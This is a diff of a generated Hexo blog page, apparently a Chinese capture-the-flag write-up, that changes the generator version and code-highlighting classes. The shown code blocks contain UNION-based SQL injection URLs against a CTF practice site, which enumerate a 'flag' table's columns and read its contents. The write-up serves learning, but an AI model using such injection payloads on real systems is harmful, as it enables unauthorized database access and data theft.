@@ -52,7 +52,7 @@
 
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
-<meta name="generator" content="Hexo 5.4.0"></head>
+<meta name="generator" content="Hexo 6.3.0"></head>
 
 
 <body>
@@ -263,7 +263,7 @@
 <div class="hljs"><pre><code class="hljs pgsql">https://hackme.inndy.tw/gb/?mod=<span class="hljs-keyword">read</span>&amp;id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">4</span>#</code></pre></div>
 <p>仍然显示<code>flag</code></p>
 <p>4.读取flag   </p>
-<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://hackme.inndy.tw/gb/?mod=read&amp;id=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(select flag from flag limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">4</span>#</code></pre></div>
+<div class="hljs"><pre><code class="hljs bash">https://hackme.inndy.tw/gb/?mod=<span class="hljs-built_in">read</span>&amp;<span class="hljs-built_in">id</span>=-1 union <span class="hljs-keyword">select</span> 1,2,(<span class="hljs-keyword">select</span> flag from flag <span class="hljs-built_in">limit</span> 1,1),4<span class="hljs-comment">#</span></code></pre></div>
 
 <p>得到flag!</p>
 
